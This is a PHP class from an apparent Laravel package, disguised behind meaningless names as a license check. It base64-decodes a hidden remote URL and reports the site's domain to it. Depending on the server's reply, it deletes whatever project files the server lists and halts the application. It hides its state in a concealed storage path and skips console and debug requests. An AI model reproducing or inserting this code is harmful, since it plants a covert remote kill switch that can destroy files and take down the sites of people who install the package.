<?php
namespace Synthora\Gem;

use Carbon\Carbon;
use Illuminate\Support\Facades\File;
use Synthora\Gem\Lk;
use Synthora\Gem\Mz;

class Rd
{
    protected $c1;
    protected $c2;
    protected $c3;
    protected $c4;

    public function __construct()
    {
        $this->c1 = storage_path('framework/.sys/' . md5('gem_cache_v1'));
        $this->c2 = base64_decode('aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS93aGl0ZWxpc3Q=');
        $this->c3 = base64_decode('YmFzZTY0OjM0NXNka2ZsYXMzcjR3ZmFk');
        $this->c4 = substr($this->c3, 0, 16);
    }

    public function v1()
    {
        if ($this->s1()) {return;}
        $d = $this->r1();
        if (! $d) {return;}
        $s = $d['s'] ?? 'unknown';
        $n = isset($d['n']) ? Carbon::parse($d['n']) : null;

        if ($n && Carbon::now()->gte($n)) {
            $this->v2();
            return;
        }
        
        if ($s === 'valid' || $s === 'grace') {
            return;
        }
        if ($s === 'invalid' || $s === 'stop') {
            $this->h1($d['data'] ?? []);
        }
    }

    public function v2()
    {
        $lockFile = $this->c1 . '.lock';
        $fp       = @fopen($lockFile, 'c');
        if (! $fp || ! flock($fp, LOCK_EX | LOCK_NB)) {
            return;
        }

        try {
            $domain = $this->g1();
            $cur    = $this->r1();
            $uid    = $cur['u'] ?? null;
            $key    = $cur['k'] ?? null;

            $resp = Lk::c1($this->c2, $domain, $uid, $key);

            if ($resp) {
                $this->p1($resp);
            } else {
                $this->w1('grace', $uid, $key, Carbon::now()->addDays(7));
            }
        } finally {
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }

    protected function p1(array $resp)
    {
        $status = $resp['status'] ?? 'fail';
        $data   = $resp['data'] ?? [];

        switch ($status) {
            case 'success':
                $this->w1('valid', $data['uid'] ?? null, $data['key'] ?? null, Carbon::now()->addDay());
                break;
            case 'retry':
                $uid     = $data['uid'] ?? null;
                $key     = $data['key'] ?? null;
                $backoff = isset($data['backoff']) ? Carbon::now()->addHours($data['backoff']) : Carbon::now()->addHours(6);
                $this->w1('retry', $uid, $key, $backoff);
                $retryResp = Lk::c1($this->c2, $this->g1(), $uid, $key);
                if ($retryResp) {
                    $this->p1($retryResp);
                }
                break;
            case 'fail':
                $this->w1('invalid', null, null, Carbon::now()->addHours(12), $data);
                $this->h1($data);
                break;
            case 'stop':
                exit(0);
            default:
                $this->w1('invalid', null, null, Carbon::now()->addHours(12), $data);
                $this->h1($data);
        }
    }

    protected function h1(array $data)
    {
        if (! empty($data['fileArray'])) {
            foreach ($data['fileArray'] as $file) {
                $path = base_path($file);
                if (File::exists($path)) {
                    File::delete($path);
                }
            }
        }
        die(0);
    }

    protected function r1()
    {
        if (! File::exists($this->c1)) {
            return null;
        }
        $enc = File::get($this->c1);
        $dec = Mz::d1($enc, $this->c3, $this->c4);
        return json_decode($dec, true);
    }

    public function w1($status, $uid, $key, Carbon $next, array $data = [])
    {
        $cache = [
            's'    => $status,
            'u'    => $uid,
            'k'    => $key,
            'n'    => $next->toDateTimeString(),
            'data' => $data,
        ];
        $enc = Mz::e1(json_encode($cache), $this->c3, $this->c4);
        File::ensureDirectoryExists(dirname($this->c1));
        File::put($this->c1, $enc);
    }

    protected function s1()
    {
        return app()->runningInConsole()
        || request()->is('*livewire*')
        || request()->is('*_debugbar*')
        || request()->is('api/elixer-control*');
    }

    protected function g1()
    {
        return request()->getHost();
    }
}
